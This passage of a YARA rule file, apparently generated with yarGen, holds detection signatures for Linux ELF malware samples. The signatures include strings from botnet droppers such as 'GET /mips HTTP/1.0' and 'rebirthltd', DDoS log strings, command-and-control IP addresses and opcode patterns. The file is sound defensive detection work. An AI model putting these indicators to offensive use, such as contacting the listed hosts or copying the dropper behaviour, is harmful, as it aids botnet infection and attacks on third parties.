      $s11 = "%tBH15" fullword ascii
      $s12 = "d'mr.|`" fullword ascii
      $s13 = "&(V|A5" fullword ascii
      $s14 = "ac{[[s" fullword ascii
      $s15 = "LZwm[O" fullword ascii
      $s16 = "4Q Wx3" fullword ascii
      $s17 = ".N>?_X" fullword ascii
      $s18 = ">gmo&dKCM" fullword ascii
      $s19 = "$k_*r6yG" fullword ascii
      $s20 = "Rq7dzj\\# " fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_197 {
   meta:
      description = "Linux_197"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "0e196ee37b5516112d7ea600f27620d012492d7637fe969f5cdb6b25af5ea8e0"
   strings:
      $s1 = "GET /arm6 HTTP/1.0" fullword ascii
      $s2 = "rebirthltd" fullword ascii

      $op0 = { 01 38 83 e1 00 3c 83 e1 02 34 83 e1 03 0c a0 e1 }
      $op1 = { ea 01 80 88 e2 01 60 53 e5 00 00 56 e3 01 30 83 }
      $op2 = { ef f0 00 bd e8 01 0a 70 e3 0e f0 a0 31 ff ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 4KB and
      ( all of them and all of ($op*) )
}

rule Linux_198 {
   meta:
      description = "Linux_198"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "289220acc96ed451582bce130286eb45eca951fd57e6b273cbe2e419156b1c22"
   strings:
      $s1 = "GET /mips HTTP/1.0" fullword ascii
      $s2 = "rebirthltd" fullword ascii

      $op0 = { 03 20 f8 09 00 80 80 21 8f bc 00 10 ac 50 00 00 }
      $op1 = { 30 a5 00 ff 00 05 2c 00 00 04 26 00 00 85 20 25 }
      $op2 = { 03 e0 00 08 27 bd 00 30 3c 1c 00 05 27 9c 84 ac }
   condition:
      uint16(0) == 0x457f and filesize < 5KB and
      ( all of them and all of ($op*) )
}

rule Linux_199 {
   meta:
      description = "Linux_199"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "5e1e797c39462c00438739aecc520017e179cc98226a27f2dd21ac863206cd8c"
   strings:
      $s1 = "GET /arm7 HTTP/1.0" fullword ascii
      $s2 = "rebirthltd" fullword ascii

      $op0 = { 01 38 83 e1 00 3c 83 e1 02 34 83 e1 03 0c a0 e1 }
      $op1 = { ea 01 80 88 e2 01 60 53 e5 00 00 56 e3 01 30 83 }
      $op2 = { ef f0 00 bd e8 01 0a 70 e3 0e f0 a0 31 ff ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 4KB and
      ( all of them and all of ($op*) )
}

rule Linux_200 {
   meta:
      description = "Linux_200"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "5fa2db242f4061748a6b5553061c5bcbc2276bb131e1888bd3f78c3b8e3aa630"
   strings:
      $s1 = "GET /mpsl HTTP/1.0" fullword ascii
      $s2 = "rebirthltd" fullword ascii

      $op0 = { 09 f8 20 03 21 80 80 00 10 00 bc 8f 00 00 50 ac }
      $op1 = { ff 00 a5 30 00 2c 05 00 00 26 04 00 25 20 85 00 }
      $op2 = { 08 00 e0 03 30 00 bd 27 05 00 1c 3c a8 84 9c 27 }
   condition:
      uint16(0) == 0x457f and filesize < 5KB and
      ( all of them and all of ($op*) )
}

rule Linux_201 {
   meta:
      description = "Linux_201"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "eb93c1e2560e399110e63a6c2eb7a622e353c6d059afc0165cc1ad79a7a56f67"
   strings:
      $s1 = "GET /arm HTTP/1.0" fullword ascii
      $s2 = "rebirthltd" fullword ascii

      $op0 = { 01 18 a0 e1 ff 18 01 e2 00 1c 81 e1 ff 30 03 e2 }
      $op1 = { ea 01 40 84 e2 00 60 d4 e5 00 00 56 e3 fb ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 3KB and
      ( all of them and all of ($op*) )
}

rule Linux_202 {
   meta:
      description = "Linux_202"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "ed5f3afceb3fb7c8930e9186bab92d11b4aafc2ec6350c6da398a62d24927102"
   strings:
      $s1 = "GET /arm5 HTTP/1.0" fullword ascii
      $s2 = "rebirthltd" fullword ascii

      $op0 = { 01 18 a0 e1 ff 18 01 e2 00 1c 81 e1 ff 30 03 e2 }
      $op1 = { ea 01 40 84 e2 00 60 d4 e5 00 00 56 e3 fb ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 3KB and
      ( all of them and all of ($op*) )
}

rule Linux_203 {
   meta:
      description = "Linux_203"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "72f942efbf10b9d0b8a1efc18f666528f390bf9d3b0e81cadac7811c8180dbae"
   strings:
      $s1 = "GET /arm6 HTTP/1.0" fullword ascii

      $op0 = { 01 38 83 e1 00 3c 83 e1 02 34 83 e1 03 0c a0 e1 }
      $op1 = { ea 01 80 88 e2 01 60 53 e5 00 00 56 e3 01 30 83 }
      $op2 = { ef f0 00 bd e8 01 0a 70 e3 0e f0 a0 31 ff ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 4KB and
      ( all of them and all of ($op*) )
}

rule Linux_204 {
   meta:
      description = "Linux_204"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "e96acdca1aae64f008976a8fc178ec73c067e3a6fa4769ae647f4de4bbc20370"
   strings:
      $s1 = "GET /arm6 HTTP/1.0" fullword ascii

      $op0 = { 01 38 83 e1 00 3c 83 e1 02 34 83 e1 03 0c a0 e1 }
      $op1 = { ea 01 80 88 e2 01 60 53 e5 00 00 56 e3 01 30 83 }
      $op2 = { ef f0 00 bd e8 01 0a 70 e3 0e f0 a0 31 ff ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 4KB and
      ( all of them and all of ($op*) )
}

rule Linux_205 {
   meta:
      description = "Linux_205"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "140f350abcea12e619e5f3171dcb44a63b04d265c10f2f8020c3a6719c9d7a84"
   strings:
      $s1 = "poi.ufK\\\"`" fullword ascii
      $s2 = "Ct5- y" fullword ascii
      $s3 = "rQIe)ux" fullword ascii
      $s4 = "gwAb'<I" fullword ascii
      $s5 = "Eh:BYFK?I" fullword ascii
      $s6 = "coimoG`" fullword ascii
      $s7 = "'/proc/self/exe" fullword ascii
      $s8 = "^NL>4q" fullword ascii
      $s9 = "wBPC]x" fullword ascii
      $s10 = "%aGc69" fullword ascii
      $s11 = "P 333HZ" fullword ascii
      $s12 = "8p*>Qm" fullword ascii
      $s13 = "^'>l>l" fullword ascii
      $s14 = "p ]rx(" fullword ascii
      $s15 = "'3HQ!}" fullword ascii
      $s16 = ")JfnM%" fullword ascii
      $s17 = "gsX+Ly" fullword ascii
      $s18 = "Ib^/0e:" fullword ascii
      $s19 = "~ N;->" fullword ascii
      $s20 = "#Kx@[jt" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_206 {
   meta:
      description = "Linux_206"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "7e9d111d12a1096c40eff76f07da50b8046badcfd0871818724eb480c901d250"
   strings:
      $s1 = "gwAb'<I" fullword ascii
      $s2 = "'/proc/self/exe" fullword ascii
      $s3 = "cqASSYC" fullword ascii
      $s4 = "QCvp2#fo" fullword ascii
      $s5 = "jwPGX!" fullword ascii
      $s6 = "\\/yss-" fullword ascii
      $s7 = "8p*>Qm" fullword ascii
      $s8 = "^'>l>l" fullword ascii
      $s9 = "Sj?2]T" fullword ascii
      $s10 = "w#XY?UID" fullword ascii
      $s11 = "7JhrIp" fullword ascii
      $s12 = "C)i;'HF" fullword ascii
      $s13 = "h1!=>P~" fullword ascii
      $s14 = ".%^WAc" fullword ascii
      $s15 = "T#j^,(lb" fullword ascii
      $s16 = "ue}ic\\V'" fullword ascii
      $s17 = "oq]yiY@" fullword ascii
      $s18 = "-B+H]D" fullword ascii
      $s19 = "hv$$y5V" fullword ascii
      $s20 = ">UPX!X" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_207 {
   meta:
      description = "Linux_207"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "20ef4be84abc3cfb87e99238c11c32628a73e92ecbf5bd7cb4b841f7af0dbf24"
   strings:
      $s1 = "gwAb'<I" fullword ascii
      $s2 = "'/proc/self/exe" fullword ascii
      $s3 = "xVzLH~gX" fullword ascii
      $s4 = "iAwt?7" fullword ascii
      $s5 = "pEuBvC;" fullword ascii
      $s6 = ".tIF=E" fullword ascii
      $s7 = "a,bOYI]CW" fullword ascii
      $s8 = "-B+H]D" fullword ascii
      $s9 = "wI ^8|" fullword ascii
      $s10 = ":#P t0" fullword ascii
      $s11 = "<*vQOU" fullword ascii
      $s12 = "(K]^,O" fullword ascii
      $s13 = "Y*?;e!" fullword ascii
      $s14 = "M}Y]z(" fullword ascii
      $s15 = "J#0\\Uv" fullword ascii
      $s16 = "J)5K_O" fullword ascii
      $s17 = "+DaFTaC" fullword ascii
      $s18 = "Uo/ES$+" fullword ascii
      $s19 = "|29a>~" fullword ascii
      $s20 = ":zKo`oRO" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_208 {
   meta:
      description = "Linux_208"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "56c169229de12e0d83c76c30c715834d79b3d95be4c59cbd7a20f02b7263a605"
   strings:
      $s1 = "rADZoa0Ur" fullword ascii /* base64 encoded string ' 6hkE+' */
      $s2 = "gwAb'<I" fullword ascii
      $s3 = "'/proc/self/exe" fullword ascii
      $s4 = "LJte2>&/85" fullword ascii
      $s5 = "kMkxG}k" fullword ascii
      $s6 = "sCzt&%>V" fullword ascii
      $s7 = ".RHp>n9\\" fullword ascii
      $s8 = "EBPWJ\"" fullword ascii
      $s9 = "dGDf:iY\"" fullword ascii
      $s10 = "YM[E{CwMhD@}" fullword ascii
      $s11 = "slNd\"b" fullword ascii
      $s12 = "NsmnmV.p" fullword ascii
      $s13 = "UrhjB-9" fullword ascii
      $s14 = "AHjKBFG:" fullword ascii
      $s15 = "\\5cm``" fullword ascii
      $s16 = "-B+H]D" fullword ascii
      $s17 = ">UPX!X" fullword ascii
      $s18 = "wI ^8|" fullword ascii
      $s19 = "ZnyVSM" fullword ascii
      $s20 = "%{s0-4S" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_209 {
   meta:
      description = "Linux_209"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "610c95298ba92defe4679f84ee3791bf35d78bab4580cada533685818f36fc63"
   strings:
      $s1 = "~H#eyEl}" fullword ascii
      $s2 = "+ :c82" fullword ascii
      $s3 = "gwAb'<I" fullword ascii
      $s4 = "'/proc/self/exe" fullword ascii
      $s5 = "StFa!_O" fullword ascii
      $s6 = "#Ngr(%S:~" fullword ascii
      $s7 = "ZzuEd<$@" fullword ascii
      $s8 = "-B+H]D" fullword ascii
      $s9 = "wI ^8|" fullword ascii
      $s10 = ">UPX!T" fullword ascii
      $s11 = "}cgC3P" fullword ascii
      $s12 = "c<^;X>" fullword ascii
      $s13 = "vM$}'p" fullword ascii
      $s14 = "$ v9x<,vf" fullword ascii
      $s15 = "O#\\Mxo" fullword ascii
      $s16 = "a.~6`;" fullword ascii
      $s17 = ";<v5DU" fullword ascii
      $s18 = "/^jU6[" fullword ascii
      $s19 = "#'eDRRP" fullword ascii
      $s20 = "5r)F-r" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_210 {
   meta:
      description = "Linux_210"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "d0731722f085a3e443c1375fde26bc16c3644424ed4ace252492e9fc1cdc912d"
   strings:
      $s1 = "gwAb'<I" fullword ascii
      $s2 = "'/proc/self/exe" fullword ascii
      $s3 = "ZEXJbCJe" fullword ascii
      $s4 = "VLAzR^*" fullword ascii
      $s5 = "SYHOV]k.S" fullword ascii
      $s6 = "-B+H]D" fullword ascii
      $s7 = "wI ^8|" fullword ascii
      $s8 = ">UPX!T" fullword ascii
      $s9 = "5Px:NA" fullword ascii
      $s10 = "Wh~XfIe5" fullword ascii
      $s11 = "m:gWbS" fullword ascii
      $s12 = "3Es4x48" fullword ascii
      $s13 = "XUa.tQ" fullword ascii
      $s14 = "-&u<9^N" fullword ascii
      $s15 = "v3_Qnf8\"" fullword ascii
      $s16 = "\"cpP.W 0z" fullword ascii
      $s17 = "$):!yd" fullword ascii
      $s18 = "5}dKXJ" fullword ascii
      $s19 = "3)K*z<=" fullword ascii
      $s20 = "rF`/){" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_211 {
   meta:
      description = "Linux_211"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "198720a409d2d229e3b89470b1229a39a00436f01554ca81df09850ccf8801af"
   strings:
      $s1 = "QShd:^m,}bRaN'" fullword ascii
      $s2 = "KbzEF\"X" fullword ascii
      $s3 = "FHgX+Gj" fullword ascii
      $s4 = "(XRLi<ji" fullword ascii
      $s5 = "ptMjB\\" fullword ascii
      $s6 = "}TXvJy(P" fullword ascii
      $s7 = "NXMyB5" fullword ascii
      $s8 = "4R4(W=" fullword ascii
      $s9 = "M0Cbm%" fullword ascii
      $s10 = "h2aRO@Y" fullword ascii
      $s11 = ";[G=*4" fullword ascii
      $s12 = "15LKnw" fullword ascii
      $s13 = "'$L&3x" fullword ascii
      $s14 = "hYK&;N" fullword ascii
      $s15 = "u\\hIsm" fullword ascii
      $s16 = "nVX!wK20vj" fullword ascii
      $s17 = "qOe%!Z" fullword ascii
      $s18 = ",q\\X3R" fullword ascii
      $s19 = "+tqt(A" fullword ascii
      $s20 = "w\"nkdQ" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_212 {
   meta:
      description = "Linux_212"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "4e670c71ce8b41eefd43421743d34a5cd90cca0297bedf78742e8cff8bf91a53"
   strings:
      $s1 = "FICMUHDKPJKCF" fullword ascii
      $s2 = "UCVAJFME" fullword ascii
      $s3 = "FGDCWNV" fullword ascii
      $s4 = "LCOGQGPTGP" fullword ascii
      $s5 = "185.196.10.155" fullword ascii
      $s6 = "LAMPPGAV\"" fullword ascii
      $s7 = "vqMWPAG" fullword ascii
      $s8 = "DMWLF\"" fullword ascii
      $s9 = "NKLWZQJGNN\"" fullword ascii
      $s10 = "sWGP[\"" fullword ascii
      $s11 = "GLVGP\"" fullword ascii
      $s12 = "UCVAJFME\"" fullword ascii
      $s13 = "AOFNKLG\"" fullword ascii
      $s14 = "CQQUMPF\"" fullword ascii
      $s15 = "JCICK\"" fullword ascii
      $s16 = "NMACN\"" fullword ascii
      $s17 = "QVCPV\"" fullword ascii
      $s18 = "}UCVAJFME\"" fullword ascii
      $s19 = "GFHICK\"" fullword ascii
      $s20 = "QVCVWQ\"" fullword ascii

      $op0 = { 80 a4 a0 00 d0 34 20 04 92 10 00 1d 02 bf ff d1 }
      $op1 = { 80 a5 a0 00 12 bf ff 9f d0 34 60 02 40 00 10 eb }
      $op2 = { d2 06 60 04 40 00 04 34 90 10 00 12 e0 06 60 04 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_213 {
   meta:
      description = "Linux_213"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "41329a43aa6e12bf278be3db7536b51f0cd54886563dc67cfa2c2322f8eb42e9"
   strings:
      $s1 = "Unable To Connect to Target: %s:%d " fullword ascii
      $s2 = "Connected To Target: %s:%d " fullword ascii
      $s3 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2" fullword ascii
      $s4 = "Sending requests to: %s:%d " fullword ascii
      $s5 = "Device Connected [Name:%s] [Arch:%s] [UID:%d]" fullword ascii
      $s6 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s7 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11" fullword ascii
      $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5" fullword ascii
      $s9 = "139.59.88.74" fullword ascii
      $s10 = "2surf2vhoi2h{h" fullword ascii
      $s11 = "arch %s" fullword ascii
      $s12 = "/net/tcp" fullword ascii
      $s13 = "x86_32.nn" fullword ascii

      $op0 = { ea 00 00 e0 e3 04 d0 8d e2 30 80 bd e8 70 40 2d }
      $op1 = { d0 d0 01 00 04 e0 2d e5 04 f0 9d e4 3c 30 9f e5 }
      $op2 = { d0 d0 01 00 80 d5 01 00 e4 d0 01 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( 8 of them and all of ($op*) )
}

rule Linux_214 {
   meta:
      description = "Linux_214"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "759997c816ea36a1d4bbe81466b849b5776f47f3c1c7821031a263e5578f9e5d"
   strings:
      $s1 = "lvrvup9w0zwi6nuqf0kilumln8ox5vgv" fullword ascii

      $op0 = { 2a 05 40 a0 e1 bc 34 9f e5 18 20 9d e5 93 62 22 }
      $op1 = { ea 16 10 a0 e3 01 00 a0 e1 f0 81 bd e8 34 2b 03 }
      $op2 = { 51 e3 0e f0 a0 01 00 00 53 e3 01 00 00 1a 03 00 }
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      ( all of them and all of ($op*) )
}

rule Linux_215 {
   meta:
      description = "Linux_215"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "b9d489e087f1a34b53f65572bd52d31389b11f3eeb9957aa7ff4ee1e6894321c"
   strings:
      $s1 = "lvrvup9w0zwi6nuqf0kilumln8ox5vgv" fullword ascii
      $s2 = " 0!'9w`" fullword ascii
      $s3 = " !'980" fullword ascii
      $s4 = " !'9J," fullword ascii
      $s5 = "H!$Jo$0" fullword ascii
      $s6 = " (!'9w" fullword ascii

      $op0 = { 3c 04 04 11 34 84 49 37 00 44 00 19 8f bc 00 18 }
      $op1 = { af a2 00 dc 3c 02 00 2d 8f a3 00 ec 34 42 00 01 }
      $op2 = { 8f a2 00 38 8f bc 00 10 8f a3 00 34 14 40 00 0b }
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      ( all of them and all of ($op*) )
}

rule Linux_216 {
   meta:
      description = "Linux_216"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "31b2a34a37ad0992e38e49d54b8e2e5cd09270dd5731fd83027ce80c05674dd1"
   strings:
      $s1 = "GET /mips HTTP/1.0" fullword ascii

      $op0 = { 03 20 f8 09 00 80 80 21 8f bc 00 10 ac 50 00 00 }
      $op1 = { 30 a5 00 ff 00 05 2c 00 00 04 26 00 00 85 20 25 }
      $op2 = { 14 40 ff fd 26 10 00 01 26 10 ff ff 8f 85 80 18 }
   condition:
      uint16(0) == 0x457f and filesize < 5KB and
      ( all of them and all of ($op*) )
}

rule Linux_217 {
   meta:
      description = "Linux_217"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "913b15f34925ecff129a283944ec1a65010f3bc7fa255f5631189c309f83028f"
   strings:
      $s1 = "GET /mips HTTP/1.0" fullword ascii

      $op0 = { 03 20 f8 09 00 80 80 21 8f bc 00 10 ac 50 00 00 }
      $op1 = { 30 a5 00 ff 00 05 2c 00 00 04 26 00 00 85 20 25 }
      $op2 = { 03 e0 00 08 27 bd 00 30 3c 1c 00 05 27 9c 84 ac }
   condition:
      uint16(0) == 0x457f and filesize < 5KB and
      ( all of them and all of ($op*) )
}

rule Linux_218 {
   meta:
      description = "Linux_218"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "367bd347a3133bfda0d369916c123ee769caad8044d6efab3dacc74ec89fd80d"
   strings:
      $s1 = "bndas[5" fullword ascii
      $s2 = "%a,i]5#" fullword ascii
      $s3 = "YYxnr9" fullword ascii
      $s4 = "+_71C*" fullword ascii
      $s5 = "zHp?-x" fullword ascii
      $s6 = ":AY=o4y" fullword ascii
      $s7 = "V3*vRj" fullword ascii
      $s8 = "O/c5,b" fullword ascii
      $s9 = "y^+1@U>/" fullword ascii
      $s10 = "0J*rH," fullword ascii
      $s11 = "x'F]Oe" fullword ascii
      $s12 = "P5pI$Hj" fullword ascii
      $s13 = "Ry04^,:" fullword ascii
      $s14 = "U]_4->" fullword ascii
      $s15 = "vIN<q\"" fullword ascii
      $s16 = "4x4y}T" fullword ascii
      $s17 = "NR5v}8" fullword ascii
      $s18 = "zM\\Xr{I,n&6/TP" fullword ascii
      $s19 = "3`4wfI" fullword ascii
      $s20 = "F/R#8r[;" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_219 {
   meta:
      description = "Linux_219"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "53cd55d36870f40208918b630d07d6aaf8031950a7368a51f2749b52e3de3d3d"
   strings:
      $s1 = "]aXArs3N" fullword ascii
      $s2 = " %s!$v" fullword ascii
      $s3 = "kLFcB%e" fullword ascii
      $s4 = "=IWLz!h" fullword ascii
      $s5 = "jDpyJ4w/" fullword ascii
      $s6 = "FYti~w," fullword ascii
      $s7 = "LoSAU[P," fullword ascii
      $s8 = "eGanvzy!T" fullword ascii
      $s9 = ":AY=o4y" fullword ascii
      $s10 = "V3*vRj" fullword ascii
      $s11 = "/2OJ*Z6" fullword ascii
      $s12 = "9KO/W," fullword ascii
      $s13 = "+!)ywQ1" fullword ascii
      $s14 = "+vtECY" fullword ascii
      $s15 = "~SFq^?" fullword ascii
      $s16 = "M&~RP*" fullword ascii
      $s17 = "]XI7Z{" fullword ascii
      $s18 = "U.g3#n" fullword ascii
      $s19 = "r4W7Dz" fullword ascii
      $s20 = "z*Q)Sd" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_220 {
   meta:
      description = "Linux_220"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "6386e44de48d89e3f9f2cb3680f7b194007aa43e02ead3993677a2a29659c341"
   strings:
      $s1 = "%ztgi#!~" fullword ascii
      $s2 = "TzxzN^]|" fullword ascii
      $s3 = "Jowo)\\X" fullword ascii
      $s4 = "U=ghoI`])" fullword ascii
      $s5 = "YLiy).t" fullword ascii
      $s6 = ":AY=o4y" fullword ascii
      $s7 = "V3*vRj" fullword ascii
      $s8 = "/2OJ*Z6" fullword ascii
      $s9 = "9KO/W," fullword ascii
      $s10 = "+!)ywQ1" fullword ascii
      $s11 = "+vtECY" fullword ascii
      $s12 = ".SYlO|" fullword ascii
      $s13 = "Tz]{~o" fullword ascii
      $s14 = "lI[Y =y" fullword ascii
      $s15 = "fJq=?|" fullword ascii
      $s16 = "h*<Xd.~" fullword ascii
      $s17 = "u\"^PD)" fullword ascii
      $s18 = "Qs?eV!G" fullword ascii
      $s19 = "Fqj{sU}0" fullword ascii
      $s20 = "doh1?@" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_221 {
   meta:
      description = "Linux_221"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "910c0b8bf6bab50482daac80df1a0e165a4321d0732e9be0b6def93991802414"
   strings:
      $s1 = "m%.GPr" fullword ascii
      $s2 = "UzwC='u" fullword ascii
      $s3 = "HCMF7?x" fullword ascii
      $s4 = "`HKCDY%%" fullword ascii
      $s5 = "BTWj8+(" fullword ascii
      $s6 = "\\h3yuL" fullword ascii
      $s7 = "EHEBi7" fullword ascii
      $s8 = ":AY=o4y" fullword ascii
      $s9 = "V3*vRj" fullword ascii
      $s10 = "/2OJ*Z6" fullword ascii
      $s11 = "9KO/W," fullword ascii
      $s12 = "+!)ywQ1" fullword ascii
      $s13 = "+vtECY" fullword ascii
      $s14 = "{u6JE|" fullword ascii
      $s15 = "8hEt:-" fullword ascii
      $s16 = "'}bs\"'Om" fullword ascii
      $s17 = "Vd)O\"a" fullword ascii
      $s18 = "uw_}<Dx" fullword ascii
      $s19 = "?V!7ua" fullword ascii
      $s20 = "SCJ61s" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_222 {
   meta:
      description = "Linux_222"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "9d36324b2c20b177cba07b928523f530850da9ce35d79814c574bda3c510b50f"
   strings:
      $s1 = "LmJ:\"9c" fullword ascii
      $s2 = "].dGETk" fullword ascii
      $s3 = "oKZcpA)R" fullword ascii
      $s4 = "iJmH5?(" fullword ascii
      $s5 = "gEGGi-O" fullword ascii
      $s6 = "kopESnoFc" fullword ascii
      $s7 = "\\A4cKIpIO" fullword ascii
      $s8 = ":AY=o4y" fullword ascii
      $s9 = "V3*vRj" fullword ascii
      $s10 = "/2OJ*Z6" fullword ascii
      $s11 = "9KO/W," fullword ascii
      $s12 = "+!)ywQ1" fullword ascii
      $s13 = "+vtECY" fullword ascii
      $s14 = "76@%(M" fullword ascii
      $s15 = "?red0!" fullword ascii
      $s16 = "3-|z-mN" fullword ascii
      $s17 = "o&N2yq" fullword ascii
      $s18 = "/0hf_u" fullword ascii
      $s19 = "8r0/ub" fullword ascii
      $s20 = "4=Zyrs" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_223 {
   meta:
      description = "Linux_223"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "caa046dba7411b0c3b25a42eec100643cd59f24a2c097db11efc936524fe15c2"
   strings:
      $s1 = "tzYJg+_" fullword ascii
      $s2 = "98%i{(" fullword ascii
      $s3 = ":AY=o4y" fullword ascii
      $s4 = "V3*vRj" fullword ascii
      $s5 = "/2OJ*Z6" fullword ascii
      $s6 = "9KO/W," fullword ascii
      $s7 = "+!)ywQ1" fullword ascii
      $s8 = "+vtECY" fullword ascii
      $s9 = "!Tb[|6<" fullword ascii
      $s10 = "v3XLu6\\" fullword ascii
      $s11 = "?>5l_\"" fullword ascii
      $s12 = "Zrz{eX" fullword ascii
      $s13 = "2zFt&Z" fullword ascii
      $s14 = "Yi?%YZD" fullword ascii
      $s15 = "DUWX7a" fullword ascii
      $s16 = "*<%~Bw" fullword ascii
      $s17 = "A5~k~8F" fullword ascii
      $s18 = "W6k1tz" fullword ascii
      $s19 = "SSrZ+z" fullword ascii
      $s20 = "0hlC\\E_4" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_224 {
   meta:
      description = "Linux_224"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "cdd175c889b62b24e6402172daca4491ec86b6fb3959cd1c975e82eb208717a4"
   strings:
      $s1 = "aqWNm\\2" fullword ascii
      $s2 = "'5.iSG" fullword ascii
      $s3 = "\\eMK-#" fullword ascii
      $s4 = "\\C%g\\;" fullword ascii
      $s5 = ":AY=o4y" fullword ascii
      $s6 = "V3*vRj" fullword ascii
      $s7 = "/2OJ*Z6" fullword ascii
      $s8 = "9KO/W," fullword ascii
      $s9 = "+!)ywQ1" fullword ascii
      $s10 = "+vtECY" fullword ascii
      $s11 = "d:hj^k" fullword ascii
      $s12 = "96BTT~R" fullword ascii
      $s13 = "[G}W|l" fullword ascii
      $s14 = "x=1#:ib" fullword ascii
      $s15 = "804{RGa8" fullword ascii
      $s16 = "Y-~Ce*" fullword ascii
